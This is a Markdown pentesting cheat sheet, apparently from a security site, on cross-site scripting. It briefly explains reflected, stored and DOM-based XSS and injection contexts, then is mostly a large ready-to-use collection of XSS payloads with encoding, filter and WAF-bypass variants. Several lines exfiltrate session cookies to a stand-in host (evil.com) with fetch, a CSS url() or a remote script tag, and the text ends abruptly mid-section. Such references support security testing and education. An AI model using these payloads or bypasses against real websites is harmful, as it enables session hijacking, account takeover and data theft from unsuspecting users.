---
title: Cross-Site Scripting (XSS)
description: Cross-Site Scripting — Reflected, Stored, DOM-based XSS payloads, WAF bypass, filter evasion, exploitation chains, privilege escalation, cookie theft, and advanced pentesting techniques.
navigation:
  icon: i-lucide-code-xml
  title: Cross-Site Scripting (XSS)
---

## What is Cross-Site Scripting (XSS)?

**Cross-Site Scripting (XSS)** is a client-side injection vulnerability that allows an attacker to inject **malicious JavaScript** into web pages viewed by other users. When a victim's browser executes the injected script, the attacker can **steal session cookies, hijack accounts, redirect users, deface websites, capture keystrokes, deploy cryptominers**, and much more — all within the security context of the trusted domain.

::callout
---
icon: i-lucide-skull
color: red
---
XSS remains the **#1 most common web vulnerability** in the wild. It appears in **OWASP Top 10**, affects millions of websites, and is the gateway to nearly every client-side attack chain including **account takeover, data exfiltration, and worm propagation**.
::

::card-group
  ::card
  ---
  title: Reflected XSS
  icon: i-lucide-arrow-left-right
  ---
  Payload is reflected off the web server in the immediate response. Requires the victim to click a crafted link. Non-persistent — affects one user per click.
  ::

  ::card
  ---
  title: Stored XSS
  icon: i-lucide-database
  ---
  Payload is permanently stored on the target server (database, comments, profiles). Every user who views the poisoned content is attacked. Most dangerous type.
  ::

  ::card
  ---
  title: DOM-Based XSS
  icon: i-lucide-file-code
  ---
  Payload is executed entirely in the browser's DOM without ever reaching the server. Client-side JavaScript processes untrusted input unsafely. Hardest to detect.
  ::

  ::card
  ---
  title: Blind XSS
  icon: i-lucide-eye-off
  ---
  Payload is stored but triggers in a different context — often admin panels, support dashboards, or log viewers that the attacker can't directly access.
  ::
::

---

## XSS Types — Deep Dive

### Reflected XSS

```text [reflected-xss-flow.txt]
┌──────────────────────────────────────────────────────────────┐
│                    REFLECTED XSS FLOW                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Attacker crafts malicious URL:                           │
│     https://target.com/search?q=<script>alert(1)</script>   │
│                                                              │
│  2. Attacker sends URL to victim (phishing, social media)    │
│                                                              │
│  3. Victim clicks the link                                   │
│                                                              │
│  4. Server reflects the search query into the HTML response: │
│     <p>Results for: <script>alert(1)</script></p>           │
│                                                              │
│  5. Victim's browser executes the injected script            │
│                                                              │
│  6. Attacker gains access to victim's session/data           │
│                                                              │
│  KEY CHARACTERISTIC:                                         │
│  └── Payload is in the REQUEST (URL, POST body, headers)     │
│  └── Server REFLECTS it into the RESPONSE                    │
│  └── NOT stored — one-time per victim click                  │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Stored XSS

```text [stored-xss-flow.txt]
┌──────────────────────────────────────────────────────────────┐
│                     STORED XSS FLOW                          │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Attacker submits payload via form/API:                   │
│     Comment: "Great post! <script>steal()</script>"          │
│                                                              │
│  2. Server stores payload in DATABASE                        │
│     INSERT INTO comments (body) VALUES                       │
│       ('Great post! <script>steal()</script>')               │
│                                                              │
│  3. ANY user visits the page with comments                   │
│                                                              │
│  4. Server renders stored comment into HTML:                 │
│     <div class="comment">                                    │
│       Great post! <script>steal()</script>                   │
│     </div>                                                   │
│                                                              │
│  5. EVERY visitor's browser executes the script              │
│                                                              │
│  KEY CHARACTERISTIC:                                         │
│  └── Payload is STORED on the server                         │
│  └── EVERY visitor is affected (no click required)           │
│  └── PERSISTENT — keeps executing until removed              │
│  └── Highest impact — can become a WORM                      │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### DOM-Based XSS

```text [dom-xss-flow.txt]
┌──────────────────────────────────────────────────────────────┐
│                    DOM-BASED XSS FLOW                         │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Page contains vulnerable JavaScript:                     │
│     var query = location.hash.substring(1);                  │
│     document.getElementById('output').innerHTML = query;     │
│                                                              │
│  2. Attacker crafts URL:                                     │
│     https://target.com/page#<img src=x onerror=alert(1)>   │
│                                                              │
│  3. Victim clicks the link                                   │
│                                                              │
│  4. Browser loads page — fragment (#...) is NOT sent         │
│     to the server                                            │
│                                                              │
│  5. Client-side JavaScript reads location.hash               │
│     and writes it to innerHTML                               │
│                                                              │
│  6. Browser parses the injected HTML → executes onerror      │
│                                                              │
│  KEY CHARACTERISTIC:                                         │
│  └── Payload NEVER reaches the server                        │
│  └── Entirely client-side vulnerability                      │
│  └── Server-side WAFs and filters are USELESS                │
│  └── Harder to detect with traditional scanners              │
│                                                              │
│  SOURCES (where input comes from):                           │
│  └── location.hash, location.search, location.href           │
│  └── document.referrer, document.URL                         │
│  └── window.name, postMessage data                           │
│  └── localStorage, sessionStorage                            │
│                                                              │
│  SINKS (where input is dangerously used):                    │
│  └── innerHTML, outerHTML, document.write()                  │
│  └── eval(), setTimeout(), setInterval()                     │
│  └── element.src, element.href, element.action               │
│  └── jQuery.html(), jQuery.append(), jQuery.$()              │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## XSS Injection Contexts

Understanding **where** your input lands in the HTML is crucial for crafting the right payload.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Context Map"}
  ```text [injection-contexts.txt]
  XSS INJECTION CONTEXTS:
  ═══════════════════════
  
  1. HTML BODY CONTEXT
     Input lands between HTML tags:
     <div>USER_INPUT_HERE</div>
     Payload: <script>alert(1)</script>
     Payload: <img src=x onerror=alert(1)>
  
  2. HTML ATTRIBUTE CONTEXT
     Input lands inside an attribute value:
     <input value="USER_INPUT_HERE">
     Payload: " onfocus=alert(1) autofocus="
     Payload: "><script>alert(1)</script>
  
  3. JAVASCRIPT STRING CONTEXT
     Input lands inside a JS string:
     <script>var x = 'USER_INPUT_HERE';</script>
     Payload: ';alert(1);//
     Payload: '</script><script>alert(1)</script>
  
  4. JAVASCRIPT TEMPLATE LITERAL
     Input lands inside backtick string:
     <script>var x = `USER_INPUT_HERE`;</script>
     Payload: ${alert(1)}
  
  5. URL/HREF CONTEXT
     Input lands in href or src attribute:
     <a href="USER_INPUT_HERE">Click</a>
     Payload: javascript:alert(1)
     Payload: data:text/html,<script>alert(1)</script>
  
  6. CSS CONTEXT
     Input lands in style attribute or tag:
     <div style="USER_INPUT_HERE">
     Payload: background:url(javascript:alert(1))  [old browsers]
     Payload: };*{background:url('https://evil.com/steal?c='+document.cookie)}
  
  7. HTML COMMENT CONTEXT
     Input lands inside HTML comment:
     <!-- USER_INPUT_HERE -->
     Payload: --><script>alert(1)</script><!--
  
  8. SVG/XML CONTEXT
     Input lands inside SVG or XML:
     <svg><text>USER_INPUT_HERE</text></svg>
     Payload: <![CDATA[<script>alert(1)</script>]]>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Context Detection"}
  ```text [context-detection.txt]
  HOW TO IDENTIFY YOUR INJECTION CONTEXT:
  ═══════════════════════════════════════
  
  Step 1: Inject a UNIQUE CANARY string
          Example: xss7e8f2a
  
  Step 2: View the page SOURCE (Ctrl+U, not Inspect!)
  
  Step 3: Search for your canary and note WHERE it appears:
  
  Found in: <div>xss7e8f2a</div>
  → HTML Body Context
  
  Found in: <input value="xss7e8f2a">
  → HTML Attribute Context (double-quoted)
  
  Found in: <input value='xss7e8f2a'>
  → HTML Attribute Context (single-quoted)
  
  Found in: <script>var x = "xss7e8f2a";</script>
  → JavaScript String Context
  
  Found in: <a href="xss7e8f2a">
  → URL/href Context
  
  Found in: <div style="color: xss7e8f2a">
  → CSS Context
  
  Found in: <!-- xss7e8f2a -->
  → HTML Comment Context
  
  Step 4: Note what CHARACTERS ARE FILTERED:
          Inject: xss'"><(){}[];:/
          Check which chars survive in the response
  
  Step 5: Choose payload based on context + allowed chars
  ```
  :::
::

---

## Payloads — Core Collection

### HTML Context Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="Script Tag"}
  ```html [script-tag-payloads.html]
  <!-- Classic Script Tag -->
  <script>alert('XSS')</script>
  <script>alert(String.fromCharCode(88,83,83))</script>
  <script>alert(document.domain)</script>
  <script>alert(document.cookie)</script>
  <script src=https://evil.com/xss.js></script>
  <script src=//evil.com/xss.js></script>

  <!-- Script with encoding -->
  <script>alert`XSS`</script>
  <script>alert(/XSS/.source)</script>
  <script>alert(1337)</script>
  <script>{alert(1)}</script>
  <script>new Function('alert(1)')()</script>
  <script>[].constructor.constructor('alert(1)')()</script>

  <!-- Script with obfuscation -->
  <script>window['al'+'ert'](1)</script>
  <script>self['alert'](1)</script>
  <script>top['alert'](1)</script>
  <script>this['alert'](1)</script>
  <script>frames['alert'](1)</script>
  <script>globalThis['alert'](1)</script>

  <!-- Script without parentheses -->
  <script>alert`1`</script>
  <script>throw~delete~alert`1`</script>
  <script>import('data:text/javascript,alert(1)')</script>
  <script>location='javascript:alert%281%29'</script>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Event Handlers"}
  ```html [event-handler-payloads.html]
  <!-- Image Error Events -->
  <img src=x onerror=alert(1)>
  <img/src=x onerror=alert(1)>
  <img src=x onerror="alert(1)">
  <img src=x onerror='alert(1)'>
  <img src=x onerror=alert`1`>
  <img src=x onerror=alert&lpar;1&rpar;>

  <!-- SVG Events -->
  <svg onload=alert(1)>
  <svg/onload=alert(1)>
  <svg onload="alert(1)">
  <svg><script>alert(1)</script></svg>
  <svg><animate onbegin=alert(1)>
  <svg><set onbegin=alert(1)>
  <svg><animateTransform onbegin=alert(1)>
  <svg><discard onbegin=alert(1)>

  <!-- Body/Frameset Events -->
  <body onload=alert(1)>
  <body onpageshow=alert(1)>
  <body onfocus=alert(1)>
  <body onhashchange=alert(1)>
  <body onscroll=alert(1)>
  <body onresize=alert(1)>

  <!-- Input Events -->
  <input onfocus=alert(1) autofocus>
  <input onblur=alert(1) autofocus><input autofocus>
  <input type=image src=x onerror=alert(1)>
  <input type=text value="" onfocus=alert(1) autofocus>

  <!-- Media Events -->
  <video src=x onerror=alert(1)>
  <video><source onerror=alert(1)>
  <audio src=x onerror=alert(1)>
  <audio onerror=alert(1)><source src=x>
  
  <!-- Details/Summary -->
  <details open ontoggle=alert(1)>
  <details ontoggle=alert(1) open>Click</details>

  <!-- Marquee (legacy but works) -->
  <marquee onstart=alert(1)>
  <marquee behavior=alternate onbounce=alert(1)>XSS</marquee>

  <!-- Select/Option -->
  <select onfocus=alert(1) autofocus>
  <select onchange=alert(1)><option>1</option><option>2</option></select>

  <!-- Textarea -->
  <textarea onfocus=alert(1) autofocus>
  <textarea onselect=alert(1)>Select me</textarea>

  <!-- Object/Embed -->
  <object data="javascript:alert(1)">
  <embed src="javascript:alert(1)">

  <!-- Iframe -->
  <iframe src="javascript:alert(1)">
  <iframe onload=alert(1)>
  <iframe srcdoc="<script>alert(1)</script>">

  <!-- Misc Events -->
  <math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click
  <isindex action=javascript:alert(1) type=submit>
  <form><button formaction=javascript:alert(1)>XSS</button></form>
  <xss contenteditable onblur=alert(1)>click and tab away</xss>
  <xss onclick=alert(1)>click me</xss>
  <xss onmouseover=alert(1)>hover me</xss>
  <xss oncontextmenu=alert(1)>right click me</xss>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="No Script Tags Needed"}
  ```html [tagless-payloads.html]
  <!-- When <script> is filtered but other tags allowed -->

  <!-- Focus-based (no user interaction with autofocus) -->
  <input onfocus=alert(1) autofocus>
  <select onfocus=alert(1) autofocus>
  <textarea onfocus=alert(1) autofocus>
  <keygen onfocus=alert(1) autofocus>
  <button onfocus=alert(1) autofocus>

  <!-- Load-based (fires automatically) -->
  <body onload=alert(1)>
  <img src=valid.jpg onload=alert(1)>
  <svg onload=alert(1)>
  <iframe onload=alert(1)>
  <link rel=import href=data:text/html,<script>alert(1)</script>>

  <!-- Error-based (fires automatically) -->
  <img src=x onerror=alert(1)>
  <video src=x onerror=alert(1)>
  <audio src=x onerror=alert(1)>
  <object data=x onerror=alert(1)>
  <script src=x onerror=alert(1)></script>

  <!-- Animation-based (fires automatically) -->
  <svg><animate onbegin=alert(1) attributeName=x>
  <svg><set onbegin=alert(1) attributeName=x>

  <!-- CSS-based trigger (no JS tags) -->
  <style>@keyframes x{}</style>
  <div style="animation-name:x" onanimationstart=alert(1)>
  <div style="animation:x 1s" onanimationend=alert(1)>
  <div style="transition:1s" ontransitionend=alert(1) style="width:1px">

  <!-- Using existing page elements -->
  <xss id=x tabindex=1 onfocus=alert(1)></xss>
  <xss id=x onfocusin=alert(1) tabindex=1></xss>
  ```
  :::
::

### Attribute Context Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="Breaking Out of Attributes"}
  ```html [attribute-breakout.html]
  <!-- Double-quoted attribute -->
  <!-- Context: <input value="USER_INPUT"> -->
  " onfocus=alert(1) autofocus="
  " autofocus onfocus=alert(1) x="
  "><script>alert(1)</script>
  "><img src=x onerror=alert(1)>
  " onmouseover=alert(1) "
  "onclick=alert(1)//"

  <!-- Single-quoted attribute -->
  <!-- Context: <input value='USER_INPUT'> -->
  ' onfocus=alert(1) autofocus='
  '><script>alert(1)</script>
  ' onmouseover=alert(1) '

  <!-- Unquoted attribute -->
  <!-- Context: <input value=USER_INPUT> -->
  x onfocus=alert(1) autofocus
  x onmouseover=alert(1)
  x><script>alert(1)</script>

  <!-- Inside href/src attribute -->
  <!-- Context: <a href="USER_INPUT"> -->
  javascript:alert(1)
  javascript:alert(document.cookie)
  javascript:void(0);alert(1)
  javascript:/**/alert(1)
  java%0ascript:alert(1)
  java%0dscript:alert(1)
  java%09script:alert(1)
  data:text/html,<script>alert(1)</script>
  data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

  <!-- Inside event handler attribute -->
  <!-- Context: <div onclick="doSomething('USER_INPUT')"> -->
  ');alert(1);//
  ');alert(1);('
  ')%3Balert(1)%3B//
  \');alert(1);//

  <!-- Inside style attribute -->
  <!-- Context: <div style="USER_INPUT"> -->
  "><img src=x onerror=alert(1)>
  ";}</style><script>alert(1)</script>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Without Closing Tag"}
  ```html [no-closing-needed.html]
  <!-- Payloads that don't need to close the attribute/tag -->
  
  <!-- Event injection without closing quote -->
  " onfocus="alert(1)" autofocus="
  ' onfocus='alert(1)' autofocus='

  <!-- Attribute injection via / -->
  "/onfocus=alert(1)/autofocus/"
  
  <!-- Using HTML entities inside attributes -->
  " onfocus=alert(1) "
  " onfocus=&#97;&#108;&#101;&#114;&#116;(1) "
  
  <!-- Backtick as attribute delimiter (IE) -->
  ` onfocus=alert(1) autofocus `
  
  <!-- Tab/newline inside event handlers -->
  " onfocus="alert(1)
  " autofocus	onfocus	=	alert(1)	"
  ```
  :::
::

### JavaScript Context Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="String Breakout"}
  ```javascript [js-string-breakout.js]
  // Context: var x = 'USER_INPUT';

  // Break out of single-quoted string
  ';alert(1);//
  ';alert(1);var x='
  '-alert(1)-'
  '+alert(1)+'
  '\x3cscript\x3ealert(1)\x3c/script\x3e

  // Context: var x = "USER_INPUT";

  // Break out of double-quoted string
  ";alert(1);//
  ";alert(1);var x="
  "-alert(1)-"
  "+alert(1)+"

  // Context: var x = `USER_INPUT`;
  // Template literals
  ${alert(1)}
  ${alert(document.domain)}
  ${alert`XSS`}
  ${[].constructor.constructor('alert(1)')()}
  ${self['alert'](1)}
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Script Block Escape"}
  ```html [script-block-escape.html]
  <!-- Context: <script>var x = 'USER_INPUT';</script> -->

  <!-- Close script tag and open new one -->
  </script><script>alert(1)</script>
  </script><img src=x onerror=alert(1)>
  </script><svg onload=alert(1)>

  <!-- Using HTML entities won't work inside <script> -->
  <!-- But Unicode escapes DO work in JavaScript -->
  \u0027;alert(1);//
  \x27;alert(1);//

  <!-- Line terminators to break JS parsing -->
  \u2028alert(1);//
  \u2029alert(1);//

  <!-- If backslash is escaped (\\) -->
  \\';alert(1);//

  <!-- Context: var x = parseInt('USER_INPUT'); -->
  1);alert(1);//
  1);alert(1);parseInt('

  <!-- Context: if (USER_INPUT) { -->
  true);alert(1);//
  1){alert(1)}if(1
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="JSON/Object Context"}
  ```javascript [json-context.js]
  // Context: var config = {"key": "USER_INPUT"};

  // Break out of JSON value
  "};alert(1);var x={"a":"
  ","__proto__":{"constructor":{"constructor":"alert(1)"}},"x":"
  
  // Context: $.getJSON('/api?callback=USER_INPUT')
  // JSONP callback injection
  alert(1)//
  alert(1);
  test({"a":1});alert(1);//

  // Context: var obj = {key: 'USER_INPUT'}
  '};alert(1);var x={'a':'
  '},x:alert(1),y:{'z':'
  ```
  :::
::

### DOM-Based XSS Payloads

::tabs
  :::tabs-item{icon="i-lucide-code" label="Location-Based Sources"}
  ```javascript [dom-location-payloads.js]
  // Vulnerable code: document.getElementById('x').innerHTML = location.hash.slice(1)
  // URL: https://target.com/page#PAYLOAD

  // Hash-based payloads
  #<img src=x onerror=alert(1)>
  #<svg onload=alert(1)>
  #<iframe src="javascript:alert(1)">
  #<details open ontoggle=alert(1)>
  #<body onload=alert(1)>

  // Vulnerable code: document.write(location.search)
  // URL: https://target.com/page?PAYLOAD

  ?<script>alert(1)</script>
  ?q=<img src=x onerror=alert(1)>
  ?name=<svg/onload=alert(1)>

  // Vulnerable code: element.innerHTML = decodeURIComponent(location.hash)
  #%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
  #%3Csvg%20onload%3Dalert(1)%3E

  // Vulnerable code: eval(location.hash.slice(1))
  #alert(1)
  #alert(document.cookie)
  #fetch('https://evil.com/steal?c='+document.cookie)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="DOM Sink Payloads"}
  ```javascript [dom-sink-payloads.js]
  // innerHTML sink
  // Sink: element.innerHTML = userInput
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

  // document.write sink
  // Sink: document.write(userInput)
  <script>alert(1)</script>
  "><script>alert(1)</script>
  </title><script>alert(1)</script>

  // eval / setTimeout / setInterval sink
  // Sink: eval(userInput) or setTimeout(userInput, 0)
  alert(1)
  alert(document.domain)
  fetch('https://evil.com/?c='+document.cookie)

  // jQuery .html() sink
  // Sink: $(element).html(userInput)
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>

  // jQuery selector sink
  // Sink: $(userInput)
  <img src=x onerror=alert(1)>
  #<script>alert(1)</script>

  // element.src / element.href sink
  // Sink: element.src = userInput
  javascript:alert(1)
  data:text/html,<script>alert(1)</script>

  // window.open sink
  // Sink: window.open(userInput)
  javascript:alert(1)

  // postMessage sink
  // Sink: window.addEventListener('message', function(e) { eval(e.data) })
  // From attacker's page:
  targetWindow.postMessage('alert(document.domain)', '*')
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="DOM Clobbering"}
  ```html [dom-clobbering.html]
  <!-- DOM Clobbering: Override JavaScript variables via HTML -->
  
  <!-- Override a variable 'config' -->
  <!-- Vulnerable code: if(config.isAdmin) { ... } -->
  <form id=config>
    <input name=isAdmin value=true>
  </form>
  <!-- Now config.isAdmin === "true" -->
  
  <!-- Override 'x.y' using nested forms -->
  <form id=x><input name=y value=evil></form>
  
  <!-- Override toString -->
  <a id=config href="javascript:alert(1)">
  <!-- config.toString() returns "javascript:alert(1)" -->
  <!-- If code does: location = config → XSS -->
  
  <!-- Override multiple levels -->
  <form id=CONFIG><output id=URL>javascript:alert(1)</output></form>
  
  <!-- Override global variables -->
  <img name=x src=1>
  <!-- window.x is now the img element -->
  <!-- If code does: if(window.x) → truthy -->
  
  <!-- Override with anchor tag (common in real exploits) -->
  <a id=defaultAvatar>
  <a id=defaultAvatar name=avatar href="https://evil.com/malware.js">
  <!-- document.all.defaultAvatar[1].href === "https://evil.com/malware.js" -->
  ```
  :::
::

---

## Encoding & Filter Bypass Payloads

### HTML Entity Encoding

::code-collapse

```html [html-entity-bypass.html]
<!-- HTML Entity Encoding Bypass -->

<!-- Decimal HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- Decodes to: alert(1) -->

<!-- Hex HTML entities -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<!-- Decodes to: alert(1) -->

<!-- Mixed encoding -->
<img src=x onerror="&#x61;lert(1)">
<img src=x onerror="al&#x65;rt(1)">

<!-- Without semicolons (works in most browsers) -->
<img src=x onerror=&#97&#108&#101&#114&#116&#40&#49&#41>

<!-- HTML entities in href -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">Click</a>
<!-- Decodes to: javascript:alert(1) -->

<!-- Double encoding (if server decodes once) -->
<img src=x onerror=&amp;#97;lert(1)>
%26%2397%3Blert(1)

<!-- Named HTML entities -->
<img src=x onerror=alert&lpar;1&rpar;>
<!-- &lpar; = ( and &rpar; = ) -->

<img src=x onerror=alert&lpar;document&period;cookie&rpar;>

<!-- Tab, newline, carriage return within entities -->
<a href="j&#x09;avascript:alert(1)">Click</a>
<a href="j&#x0A;avascript:alert(1)">Click</a>
<a href="j&#x0D;avascript:alert(1)">Click</a>
```

::

### JavaScript Encoding

::code-collapse

```javascript [js-encoding-bypass.js]
// Unicode escape sequences
\u0061\u006C\u0065\u0072\u0074(1)  // alert(1)
\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029  // alert(1)

// Hex escape sequences (inside strings only)
'\x61\x6c\x65\x72\x74\x28\x31\x29'  // "alert(1)"
eval('\x61\x6c\x65\x72\x74\x28\x31\x29')

// Octal escape sequences
'\141\154\145\162\164\050\061\051'  // "alert(1)"
eval('\141\154\145\162\164\050\061\051')

// ES6 Unicode code point escapes
\u{61}\u{6C}\u{65}\u{72}\u{74}(1)  // alert(1)
\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}(1)

// String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// atob (Base64)
eval(atob('YWxlcnQoMSk='))  // alert(1)
eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))  // alert(document.cookie)

// Constructor chain
[].constructor.constructor('alert(1)')()
[]['constructor']['constructor']('alert(1)')()
''['constructor']['constructor']('alert(1)')()

// Function constructor
Function('alert(1)')()
new Function('alert(1)')()
Function`alert(1)```  // Template literal

// Indirect eval
window['eval']('alert(1)')
this['eval']('alert(1)')
[]['constructor']['constructor']('return eval')()('alert(1)')

// Reflect
Reflect.apply(alert, null, [1])
Reflect.apply(Function.prototype.call, alert, [null, 1])
```

::

### URL Encoding Bypass

::code-collapse

```text [url-encoding-bypass.txt]
URL ENCODING BYPASS TECHNIQUES:
═══════════════════════════════

Single URL encoding:
%3Cscript%3Ealert(1)%3C/script%3E
<!-- <script>alert(1)</script> -->

Double URL encoding (if server decodes twice):
%253Cscript%253Ealert(1)%253C/script%253E

Triple URL encoding:
%25253Cscript%25253Ealert(1)%25253C%252Fscript%25253E

Mixed encoding:
%3Cscript%3E%61lert(1)%3C/script>

Unicode normalization bypass:
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
(overlong UTF-8 encoding of < and >)

UTF-7 encoding (if charset not specified):
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

URL encoding of javascript: scheme:
%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)
java%73cript:alert(1)
javas%63ript:alert(1)
javascript%3Aalert(1)    <!-- Won't work: colon must not be encoded -->

Null byte injection (legacy):
%00<script>alert(1)</script>
<scr%00ipt>alert(1)</scr%00ipt>

URL encoding with tabs/newlines:
java%09script:alert(1)
java%0ascript:alert(1)
java%0dscript:alert(1)
java%0d%0ascript:alert(1)
j%0aava%0dscri%09pt:alert(1)
```

::

### Case & Space Manipulation

::tabs
  :::tabs-item{icon="i-lucide-code" label="Case Tricks"}
  ```html [case-manipulation.html]
  <!-- Mixed case (bypasses case-sensitive filters) -->
  <ScRiPt>alert(1)</ScRiPt>
  <sCrIpT>alert(1)</sCrIpT>
  <SCRIPT>alert(1)</SCRIPT>
  <scRIPt>alert(1)</scRIPt>

  <Img Src=x OnError=alert(1)>
  <IMG SRC=x ONERROR=alert(1)>
  <iMg SrC=x oNeRrOr=alert(1)>

  <SVG ONLOAD=alert(1)>
  <Svg OnLoad=alert(1)>

  <!-- JavaScript scheme case -->
  <a href="JaVaScRiPt:alert(1)">Click</a>
  <a href="JAVASCRIPT:alert(1)">Click</a>
  <a href="jAvAsCrIpT:alert(1)">Click</a>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Whitespace Tricks"}
  ```html [whitespace-manipulation.html]
  <!-- Tabs, newlines, null bytes between tag/attribute -->
  <img/src=x/onerror=alert(1)>
  <img	src=x	onerror=alert(1)>
  <img
  src=x
  onerror=alert(1)>
  <img src=x onerror=alert(1)>

  <!-- No space needed with / -->
  <svg/onload=alert(1)>
  <img/src=x/onerror=alert(1)>
  <body/onload=alert(1)>

  <!-- Multiple spaces -->
  <img   src=x   onerror=alert(1)>

  <!-- Newlines in JavaScript -->
  <script>
  a
  l
  e
  r
  t(1)</script>

  <!-- Zero-width characters -->
  <script>al​ert(1)</script>  <!-- Zero-width space U+200B -->
  <!-- Note: may not work in all contexts -->

  <!-- Form feed character -->
  <img src=x onerror=alert(1)>

  <!-- Vertical tab -->
  <img src=x onerror=alert(1)>
  ```
  :::
::

---

## WAF Bypass Techniques

### Common WAF Evasion

::tabs
  :::tabs-item{icon="i-lucide-code" label="Tag Alternatives"}
  ```html [waf-tag-alternatives.html]
  <!-- When <script> is blocked -->
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <body onload=alert(1)>
  <input onfocus=alert(1) autofocus>
  <details open ontoggle=alert(1)>
  <video src=x onerror=alert(1)>
  <audio src=x onerror=alert(1)>
  <marquee onstart=alert(1)>
  <meter onmouseover=alert(1)>0</meter>
  <textarea onfocus=alert(1) autofocus>
  <select onfocus=alert(1) autofocus>
  <math><maction actiontype=toggle><script>alert(1)</script></maction></math>
  <xss style="behavior:url(xss.htc)">  <!-- IE only -->

  <!-- Using lesser-known HTML tags -->
  <isindex action=javascript:alert(1) type=submit>
  <form><button formaction=javascript:alert(1)>XSS</button>
  <form><isindex formaction=javascript:alert(1) type=submit>
  <table background="javascript:alert(1)">  <!-- IE -->
  <base href="javascript:alert(1)"/><a href="/">Click</a>

  <!-- Custom elements / unknown tags -->
  <xss id=x onfocus=alert(1) tabindex=1>focus me</xss>
  <custom-tag onmouseover=alert(1)>hover</custom-tag>

  <!-- Using SVG namespace -->
  <svg><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x">
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Keyword Evasion"}
  ```html [waf-keyword-evasion.html]
  <!-- When "alert" is blocked -->
  <img src=x onerror=confirm(1)>
  <img src=x onerror=prompt(1)>
  <img src=x onerror=console.log(1)>
  <img src=x onerror=print()>   <!-- Opens print dialog -->
  <img src=x onerror=window.alert(1)>
  <img src=x onerror=self.alert(1)>
  <img src=x onerror=top.alert(1)>
  <img src=x onerror=parent.alert(1)>
  <img src=x onerror=frames.alert(1)>
  <img src=x onerror=globalThis.alert(1)>
  <img src=x onerror=alert?.call(null,1)>
  <img src=x onerror=[1].find(alert)>
  <img src=x onerror=[1].map(alert)>
  <img src=x onerror=[1].every(alert)>
  <img src=x onerror=[1].filter(alert)>
  <img src=x onerror=[1].forEach(alert)>
  <img src=x onerror=[1].findIndex(alert)>

  <!-- String concatenation to bypass keyword filters -->
  <img src=x onerror=window['al'+'ert'](1)>
  <img src=x onerror=window['\x61lert'](1)>
  <img src=x onerror=window['\u0061lert'](1)>
  <img src=x onerror=self[atob('YWxlcnQ=')](1)>
  <img src=x onerror=top[/al/.source+/ert/.source](1)>

  <!-- When "onerror" is blocked -->
  <svg onload=alert(1)>
  <body onload=alert(1)>
  <input onfocus=alert(1) autofocus>
  <details open ontoggle=alert(1)>
  <video onloadstart=alert(1)><source>
  <style onload=alert(1)>
  <object onerror=alert(1)>
  <math href="javascript:alert(1)">click</math>
  <a href="javascript:alert(1)">click</a>

  <!-- When "document" is blocked -->
  <img src=x onerror=alert(this['doc'+'ument'].cookie)>
  <img src=x onerror=alert(window['doc\x75ment'].cookie)>
  <img src=x onerror=alert(self['\x64ocument'].cookie)>

  <!-- When "cookie" is blocked -->
  <img src=x onerror=alert(document['coo'+'kie'])>
  <img src=x onerror=alert(document['\x63ookie'])>
  <img src=x onerror=alert(document[atob('Y29va2ll')])>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Parentheses Bypass"}
  ```html [waf-parentheses-bypass.html]
  <!-- When ( ) are blocked/filtered -->

  <!-- Using template literals (backticks) -->
  <img src=x onerror=alert`1`>
  <svg onload=alert`XSS`>
  <img src=x onerror=confirm`1`>

  <!-- Using throw with error handler -->
  <img src=x onerror="window.onerror=alert;throw 1">
  <img src=x onerror="throw onerror=alert,1">
  <svg onload="throw onerror=alert,1337">

  <!-- Using location -->
  <img src=x onerror=location='javascript:alert\x281\x29'>
  <img src=x onerror="location='javascript:alert%281%29'">

  <!-- Using import() -->
  <img src=x onerror="import`data:text/javascript,alert${1}`">
  <script>import`data:text/javascript,alert${1}`</script>

  <!-- Using toString -->
  <img src=x onerror=alert&#40;1&#41;>   <!-- HTML entities for ( ) -->
  <img src=x onerror=alert&lpar;1&rpar;>

  <!-- Using object destructuring -->
  <img src=x onerror="{alert`1`}">

  <!-- Without alert AND parentheses -->
  <img src=x onerror="location='javascript:'+['ale'+'rt'].join``+'`1`'">
